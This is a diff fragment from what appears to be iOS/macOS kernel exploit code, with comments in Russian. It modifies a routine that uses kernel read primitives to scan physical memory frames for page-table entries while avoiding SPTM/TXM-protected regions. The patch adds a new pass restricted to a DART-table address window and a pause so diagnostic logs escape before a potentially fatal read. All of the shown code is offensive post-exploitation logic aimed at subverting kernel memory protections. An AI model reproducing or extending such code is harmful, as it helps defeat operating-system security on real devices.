@@ -6965,18 +6965,26 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             uint64_t srcPA = spix ? vtophys(ttM, (uint64_t)spix) : 0;
             int nCand = 0, nScanned = 0, nLoose = 0, nCap = 0;
             static uint8_t ftChunk[0x10000];   // 4096 фреймов за проход
-            // pass 0: редкие табличные типы — все; pass 1: 0x21 — кап 2048
-            for (int pass = 0; pass < 2 && !pteVA && ftVA; pass++) {
+            // 1.9.193: тройной заход против убийцы у КРАЯ табличного региона
+            // (тихий ресет 00:37 — смерть на фрейме сразу за полосой 0x9):
+            //  pass 0: редкие типы, ТОЛЬКО окно таблиц [0x10008000000..0x10010000000]
+            //          (оба бута DART-таблицы сидели там — в 4 раза меньше поле смерти);
+            //  pass 1: редкие типы, полный проход;
+            //  pass 2: 0x21, кап 2048.
+            // Пауза 2мс после предсмертной строки — os_log успевает уйти по USB
+            // до смертельного чтения: убийца будет назван, даже если гипотеза мимо.
+            for (int pass = 0; pass < 3 && !pteVA && ftVA; pass++) {
                 for (uint64_t fb = 0; fb < totalPages && !pteVA; fb += 4096) {
                     uint64_t nent = totalPages - fb; if (nent > 4096) nent = 4096;
                     kreadbuf(ftVA + fb * 16, ftChunk, (size_t)(nent * 16));
                     for (uint64_t e = 0; e < nent && !pteVA; e++) {
                         uint8_t t = ftChunk[e * 16 + 2];   // тип = байт 2 (LE, bits[23:16])
                         BOOL rare = (t == 0x8 || t == 0x9 || t == 0x13 || t == 0x17 || t == 0xc || t == 0x6);
-                        if (pass == 0 ? !rare : (t != 0x21)) continue;
-                        nCand++;
-                        if (pass == 1 && nScanned >= 2048) { nCap++; continue; }
+                        if (pass < 2 ? !rare : (t != 0x21)) continue;
                         uint64_t pa = kconstant(physBase) + (fb + e) * 0x4000;
+                        if (pass == 0 && (pa < 0x10008000000ULL || pa >= 0x10010000000ULL)) continue;   // окно таблиц
+                        nCand++;
+                        if (pass == 2 && nScanned >= 2048) { nCap++; continue; }
                         uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
                         if (!kva) continue;
                         if (kpVAIsEL2Domain(kva)) continue;   // 1.9.192: physmap-VA может численно попасть в SPTM/TXM-полосу — пропуск
@@ -6986,6 +6994,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         // строка назовёт тип убийцы (census-стратегия, поймавшая 0xb).
                         kpNote(r, [NSString stringWithFormat:@"  [P3] читаю фрейм %#llx t=%#x kva=%#llx",
                                   (unsigned long long)pa, t, (unsigned long long)kva]);
+                        usleep(2000);   // 1.9.193: дать os_log уйти по USB до смертельного чтения
                         uint8_t pbuf[0x4000];
                         kreadbuf(kva, pbuf, sizeof(pbuf));   // рет НЕ проверяем — шим всегда 0 (урок SCAN A)
                         for (uint32_t o = 0; o + 8 <= sizeof(pbuf) && !pteVA; o += 8) {
